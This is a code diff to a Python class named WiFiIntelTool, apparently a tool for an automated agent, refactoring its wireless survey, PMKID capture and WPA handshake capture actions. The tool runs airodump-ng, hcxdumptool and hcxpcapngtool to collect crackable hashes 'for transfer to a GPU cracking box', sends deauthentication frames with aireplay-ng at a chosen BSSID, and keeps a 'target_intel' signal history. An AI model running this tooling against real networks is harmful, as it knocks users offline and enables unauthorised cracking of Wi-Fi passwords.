@@ -8,6 +8,7 @@ directory with metadata JSON for transfer to a GPU cracking box.
 from __future__ import annotations
 
 import asyncio
+import csv
 import json
 import logging
 import re
@@ -121,12 +122,8 @@ class WiFiIntelTool(Tool):
     async def execute(self, **kwargs: Any) -> str:
         action = kwargs.get("action", "")
         dispatch = {
-            "monitor_start": lambda: self._monitor_start(
-                kwargs.get("interface", self._iface)
-            ),
-            "monitor_stop": lambda: self._monitor_stop(
-                kwargs.get("monitor_interface", self._mon)
-            ),
+            "monitor_start": lambda: self._monitor_start(kwargs.get("interface", self._iface)),
+            "monitor_stop": lambda: self._monitor_stop(kwargs.get("monitor_interface", self._mon)),
             "survey": lambda: self._survey(
                 band=kwargs.get("band", "2.4"),
                 duration=int(kwargs.get("duration", 900)),
@@ -143,9 +140,7 @@ class WiFiIntelTool(Tool):
                 ssid=kwargs.get("ssid"),
                 duration=int(kwargs.get("duration", 60)),
             ),
-            "signal_history": lambda: self._signal_history(
-                bssid=kwargs.get("bssid", "")
-            ),
+            "signal_history": lambda: self._signal_history(bssid=kwargs.get("bssid", "")),
             "export": lambda: self._export(),
         }
         fn = dispatch.get(action)
@@ -172,11 +167,14 @@ class WiFiIntelTool(Tool):
             stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
         except asyncio.TimeoutError:
             proc.kill()
-            return f"Command timed out after {timeout}s: {' '.join(args)}"
-        output = stdout.decode(errors="replace")
-        if stderr:
-            output += f"\n[stderr] {stderr.decode(errors='replace')}"
-        return output.strip()
+            await proc.wait()
+            raise RuntimeError(f"Command timed out after {timeout}s: {' '.join(args)}")
+        out = stdout.decode(errors="replace").strip()
+        err = stderr.decode(errors="replace").strip()
+        if proc.returncode != 0:
+            detail = err or out
+            raise RuntimeError(f"Command exited {proc.returncode}: {' '.join(args)}\n{detail}")
+        return (out + (f"\n[stderr] {err}" if err else "")).strip()
 
     async def _run_background(self, *args: str) -> asyncio.subprocess.Process:
         """Start a subprocess in the background; caller is responsible for termination."""
@@ -190,13 +188,14 @@ class WiFiIntelTool(Tool):
     # ── Capture directory helper ───────────────────────────────────────────────
 
     def _capture_dir(self, ssid: str = "", bssid: str = "") -> Path:
-        """Return (and create) a timestamped capture directory."""
-        ts = int(time.time())
-        safe_ssid = _sanitize(ssid) if ssid else "unknown"
-        safe_bssid = bssid.replace(":", "") if bssid else "000000000000"
+        """Return (and create) a uniquely-named capture directory."""
+        ts = time.time_ns()
+        safe_ssid = _sanitize(ssid)[:64] if ssid else "unknown"
+        # Sanitize BSSID to hex chars only, no colons or other injected content
+        safe_bssid = re.sub(r"[^0-9A-Fa-f]", "", bssid)[:12] or "000000000000"
         name = f"{ts}_{safe_ssid}_{safe_bssid}"
         d = self._workspace / "wifi_captures" / name
-        d.mkdir(parents=True, exist_ok=True)
+        d.mkdir(parents=True, exist_ok=False)
         return d
 
     # ── Actions ────────────────────────────────────────────────────────────────
@@ -262,9 +261,12 @@ class WiFiIntelTool(Tool):
         if channels:
             cmd = [
                 "airodump-ng",
-                "--write", cap_base,
-                "--output-format", "csv,pcap",
-                "-c", channels,
+                "--write",
+                cap_base,
+                "--output-format",
+                "csv,pcap",
+                "-c",
+                channels,
                 mon_iface,
             ]
         else:
@@ -272,9 +274,12 @@ class WiFiIntelTool(Tool):
             band_flag = band_map.get(band, "bg")
             cmd = [
                 "airodump-ng",
-                "--write", cap_base,
-                "--output-format", "csv,pcap",
-                "--band", band_flag,
+                "--write",
+                cap_base,
+                "--output-format",
+                "csv,pcap",
+                "--band",
+                band_flag,
                 mon_iface,
             ]
 
@@ -320,7 +325,16 @@ class WiFiIntelTool(Tool):
         return json.dumps(summary)
 
     def _parse_airodump_csv(self, csv_path: Path) -> tuple[list[dict], list[dict]]:
-        """Parse airodump-ng CSV into (aps, stations) lists."""
+        """Parse airodump-ng CSV into (aps, stations) lists.
+
+        airodump-ng CSV format has two sections separated by a blank line:
+          1. AP section   — header: BSSID, First time seen, Last time seen, channel,
+                            Speed, Privacy, Cipher, Authentication, Power, # beacons,
+                            # IV, LAN IP, ID-length, ESSID, Key
+          2. Station section — header: Station MAC, First time seen, Last time seen,
+                               Power, # packets, BSSID, Probed ESSIDs
+        """
+        _mac_re = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
         aps: list[dict] = []
         stations: list[dict] = []
         try:
@@ -328,50 +342,49 @@ class WiFiIntelTool(Tool):
         except OSError:
             return aps, stations
 
-        # airodump-ng CSV has two sections separated by a blank line:
-        # 1. AP section (starts with header "BSSID, First time seen, ...")
-        # 2. Station section (starts with header "Station MAC, ...")
         sections = re.split(r"\n\s*\n", text, maxsplit=1)
         ap_section = sections[0] if sections else ""
         sta_section = sections[1] if len(sections) > 1 else ""
 
-        for line in ap_section.splitlines():
-            line = line.strip()
-            if not line or line.startswith("BSSID"):
+        def _int(val: str) -> int:
+            try:
+                return int(val.strip())
+            except ValueError:
+                return 0
+
+        # ── AP section ────────────────────────────────────────────────────────
+        reader = csv.reader(ap_section.splitlines())
+        for row in reader:
+            if not row or row[0].strip().upper() == "BSSID":
                 continue
-            parts = [p.strip() for p in line.split(",")]
+            parts = [p.strip() for p in row]
             if len(parts) < 14:
                 continue
-            bssid = parts[0].strip()
-            if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
+            bssid = parts[0]
+            if not _mac_re.match(bssid):
                 continue
-            try:
-                rssi = int(parts[8]) if parts[8].strip().lstrip("-").isdigit() else 0
-            except (IndexError, ValueError):
-                rssi = 0
-            try:
-                channel = int(parts[3].strip()) if parts[3].strip().lstrip("-").isdigit() else 0
-            except (IndexError, ValueError):
-                channel = 0
-            encryption = parts[5].strip() if len(parts) > 5 else ""
-            ssid = parts[13].strip() if len(parts) > 13 else ""
-            aps.append({"bssid": bssid, "ssid": ssid, "channel": channel, "rssi": rssi, "encryption": encryption})
+            aps.append(
+                {
+                    "bssid": bssid,
+                    "ssid": parts[13],
+                    "channel": _int(parts[3]),
+                    "rssi": _int(parts[8]),
+                    "encryption": parts[5],
+                }
+            )
 
-        for line in sta_section.splitlines():
-            line = line.strip()
-            if not line or line.startswith("Station MAC"):
+        # ── Station section ───────────────────────────────────────────────────
+        reader = csv.reader(sta_section.splitlines())
+        for row in reader:
+            if not row or row[0].strip().upper() == "STATION MAC":
                 continue
-            parts = [p.strip() for p in line.split(",")]
-            if len(parts) < 6:
+            parts = [p.strip() for p in row]
+            if len(parts) < 4:
                 continue
-            mac = parts[0].strip()
-            if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac):
+            mac = parts[0]
+            if not _mac_re.match(mac):
                 continue
-            try:
-                rssi = int(parts[3].strip()) if parts[3].strip().lstrip("-").isdigit() else 0
-            except (IndexError, ValueError):
-                rssi = 0
-            stations.append({"mac": mac, "rssi": rssi})
+            stations.append({"mac": mac, "rssi": _int(parts[3])})
 
         return aps, stations
 
@@ -391,8 +404,10 @@ class WiFiIntelTool(Tool):
 
         cmd = [
             "hcxdumptool",
-            "-i", self._mon,
-            "-o", str(pcapng_path),
+            "-i",
+            self._mon,
+            "-o",
+            str(pcapng_path),
             "--active_beacon",
             "--enable_status=1",
         ]
@@ -407,7 +422,8 @@ class WiFiIntelTool(Tool):
         convert_output = await self._run(
             "hcxpcapngtool",
             str(pcapng_path),
-            "-o", str(hc22000_path),
+            "-o",
+            str(hc22000_path),
             timeout=60,
         )
 
@@ -425,15 +441,17 @@ class WiFiIntelTool(Tool):
         }
         meta_path.write_text(json.dumps(metadata, indent=2))
 
-        return json.dumps({
-            "action": "capture_pmkid",
-            "capture_path": str(cap_dir),
-            "pcapng": str(pcapng_path),
-            "hc22000": str(hc22000_path),
-            "metadata": metadata,
-            "hcxdumptool_output": capture_output[:500],
-            "hcxpcapngtool_output": convert_output[:300],
-        })
+        return json.dumps(
+            {
+                "action": "capture_pmkid",
+                "capture_path": str(cap_dir),
+                "pcapng": str(pcapng_path),
+                "hc22000": str(hc22000_path),
+                "metadata": metadata,
+                "hcxdumptool_output": capture_output[:500],
+                "hcxpcapngtool_output": convert_output[:300],
+            }
+        )
 
     async def _capture_handshake(
         self,
@@ -458,10 +476,14 @@ class WiFiIntelTool(Tool):
         # Step 2: start airodump-ng in background
         airodump_proc = await self._run_background(
             "airodump-ng",
-            "-c", str(channel),
-            "--bssid", bssid,
-            "-w", cap_base,
-            "--output-format", "pcap",
+            "-c",
+            str(channel),
+            "--bssid",
+            bssid,
+            "-w",
+            cap_base,
+            "--output-format",
+            "pcap",
             self._mon,
         )
 
@@ -471,8 +493,10 @@ class WiFiIntelTool(Tool):
         # Step 3: send deauth frames to trigger handshake
         deauth_output = await self._run(
             "aireplay-ng",
-            "-0", "5",
-            "-a", bssid,
+            "-0",
+            "5",
+            "-a",
+            bssid,
             self._mon,
             timeout=30,
         )
@@ -509,16 +533,18 @@ class WiFiIntelTool(Tool):
         }
         meta_path.write_text(json.dumps(metadata, indent=2))
 
-        return json.dumps({
-            "action": "capture_handshake",
-            "bssid": bssid,
-            "ssid": ssid or "",
-            "channel": channel,
-            "capture_path": str(cap_dir),
-            "cap_file": str(cap_file),
-            "deauth_output": deauth_output[:300],
-            "metadata": metadata,
-        })
+        return json.dumps(
+            {
+                "action": "capture_handshake",
+                "bssid": bssid,
+                "ssid": ssid or "",
+                "channel": channel,
+                "capture_path": str(cap_dir),
+                "cap_file": str(cap_file),
+                "deauth_output": deauth_output[:300],
+                "metadata": metadata,
+            }
+        )
 
     async def _signal_history(self, bssid: str) -> str:
         """Query target_intel for RSSI history for a BSSID."""
@@ -550,11 +576,13 @@ class WiFiIntelTool(Tool):
             return json.dumps({"bssid": bssid, "records": [], "message": "No records found"})
 
         records = [dict(r) for r in rows]
-        return json.dumps({
-            "bssid": bssid,
-            "ssid": records[0].get("ssid", ""),
-            "records": records,
-        })
+        return json.dumps(
+            {
+                "bssid": bssid,
+                "ssid": records[0].get("ssid", ""),
+                "records": records,
+            }
+        )
 
     async def _export(self) -> str:
         """Dump all known WiFi networks from target_intel + list capture files."""
@@ -584,15 +612,18 @@ class WiFiIntelTool(Tool):
                         pass
                 captures.append(entry)
 
-        return json.dumps({
-            "action": "export",
-            "network_count": len(networks),
-            "networks": networks,
-            "capture_dirs": captures,
-        })
+        return json.dumps(
+            {
+                "action": "export",
+                "network_count": len(networks),
+                "networks": networks,
+                "capture_dirs": captures,
+            }
+        )
 
 
 # ── Utility: parse airodump stdout when CSV is unavailable ────────────────────
+
 
 def _parse_airodump_stdout(output: str) -> tuple[list[dict], list[dict]]:
     """Best-effort BSSID/SSID extraction from airodump-ng terminal output."""
